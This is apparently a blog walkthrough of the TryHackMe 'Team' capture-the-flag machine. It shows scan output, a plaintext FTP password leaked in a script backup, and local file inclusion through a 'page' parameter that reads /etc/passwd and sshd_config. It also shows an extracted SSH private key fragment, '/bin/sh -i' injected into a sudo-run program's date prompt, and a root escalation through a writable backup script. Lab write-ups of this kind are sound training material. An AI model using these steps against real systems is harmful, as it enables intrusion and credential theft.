---
title: Team
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Team machine
  on TryHackMe.
slug: team
---




```
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:b0:c3:3a:24:52:19:19:5a:47:47:4a:e7:27:eb:02 (RSA)
|   256 21:57:6a:6c:b9:39:df:90:ee:39:35:b8:2b:96:2b:fe (ECDSA)
|_  256 9f:49:e2:47:73:1d:20:25:78:b8:e6:2e:8d:db:cf:15 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
| http-enum: 
|   /robots.txt: Robots file
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (91%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:5 cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Crestron XPanel control system (86%), Linux 2.6.32 - 3.13 (86%), Linux 3.10 - 4.11 (86%), Linux 3.13 - 4.4 (86%), Linux 3.2 - 4.14 (86%), Linux 3.8 - 3.16 (86%), Linux 4.15 - 5.19 (86%), Linux 4.4 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


> found something using gobuster

```
/index.html 
/images   
/scripts   
/assets            
/robots.txt 
```

> and another one

```
gobuster dir -u team.thm/scripts/

/script.txt 

```

```
❯ curl http://team.thm/robots.txt
dale

```

```
❯ curl http://team.thm/scripts/script.txt
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit


# Note to self had to change the extension of the old "script" in this folder, as it has creds in


```

```
❯ ffuf -t 80 -u http://team.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt

________________________________________________

.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 651ms]
.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 5768ms]
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 407ms]
images                  [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 750ms]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 1825ms]
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 661ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 595ms]



❯ ffuf -t 80 -u http://team.thm/scripts/scriptFUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt


.txt                    [Status: 200, Size: 597, Words: 52, Lines: 22, Duration: 5225ms]
.old                    [Status: 200, Size: 466, Words: 27, Lines: 19, Duration: 1076ms]
.phps                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 1445ms]
:: Progress: [2450/2450] :: Job [1/1] :: 64 req/sec :: Duration: [0:01:54] :: Errors: 58 ::


```

```
❯ cat script.old
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

```

> So log in to ftp and found something

```
ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
100% |**********************************************************|   269        2.31 MiB/s    00:00 ETA
226 Transfer complete.
269 bytes received in 00:00 (0.82 KiB/s)


```

```
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 

```

> add to hosts

```
❯ curl dev.team.thm
<html>
 <head>
  <title>UNDER DEVELOPMENT</title>
 </head>
 <body>
  Site is being built<a href=script.php?page=teamshare.php </a>
<p>Place holder link to team share</p>
 </body>
</html>


```


```
http://dev.team.thm/

Site is being built[

Place holder link to team share

](http://dev.team.thm/script.php?page=teamshare.php)

```

> after click link  it shows nothing but look at the link

> `http://dev.team.thm/script.php?page=teamshare.php`  what if we change url like this `http://dev.team.thm/script.php?page=/home/dale/user.txt`  boom! we got something


> so change url to something you learn about

> `curl http://dev.team.thm/script.php\?page\=/etc/passwd`
> `curl -s http://dev.team.thm/script.php\?page\=/etc/passwd |grep sh`
> `curl -s http://dev.team.thm/script.php\?page\=/etc/ssh/sshd_config`

> so now you found something good ssd id isa so using that login to ssh

> if you have error `error in libcrypto`  I use like this

```
❯ # make a backup just in case
cp dale_id_rsa dale_id_rsa.bak

# create a file that contains only the BEGIN...END block (no comments, no extra lines)
sed 's/^#\s*//' dale_id_rsa | awk '/^-----BEGIN OPENSSH PRIVATE KEY-----/{p=1} p; /^-----END OPENSSH PRIVATE KEY-----/{print; exit}' > only_dale_key

# secure it
chmod 600 only_dale_key

# quick peek
head -n 3 only_dale_key
tail -n 3 only_dale_key

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----

```



```
dale@ip-10-201-51-96:~$ cat user.txt

```

```
dale@ip-10-201-77-128:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: a
Enter 'date' to timestamp the file: /bin/bash
dale@ip-10-201-77-128:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: a
Enter 'date' to timestamp the file: /bin/sh -i
The Date is 

ls
admin_checks
cd ..
ls
dale  ftpuser  gyles  ssm-user  ubuntu

id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
python3 -c 'import pty; pty.spawn("/bin/bash")'
gyles@ip-10-201-77-128:/home$ 


```


```
gyles@ip-10-201-51-96:/usr/local/bin$ ls -la
total 12
drwxrwxr-x  2 root admin 4096 Jan 17  2021 .
drwxr-xr-x 10 root root  4096 Jan 15  2021 ..
-rwxrwxr-x  1 root admin   65 Jan 17  2021 main_backup.sh

gyles@ip-10-201-51-96:/usr/local/bin$ nano main_backup.sh

```

> add reverse shell and getting root and `root.txt`